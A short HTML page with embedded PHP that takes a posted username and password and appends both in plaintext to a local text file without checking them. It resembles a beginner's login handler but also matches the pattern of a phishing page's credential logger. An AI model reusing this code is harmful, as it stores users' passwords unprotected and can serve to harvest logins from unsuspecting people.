<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <link rel="stylesheet" href="login.css">
</head>
<body>


<?php

$username = $_POST["username"]; 
$password = $_POST["password"];

$validateLogin = fopen("loginformation.txt", "a+") or die("Unable to open file!");
fwrite($validateLogin, $username. ";". $password."\n");
fclose($validateLogin);



?>

</body>
</html>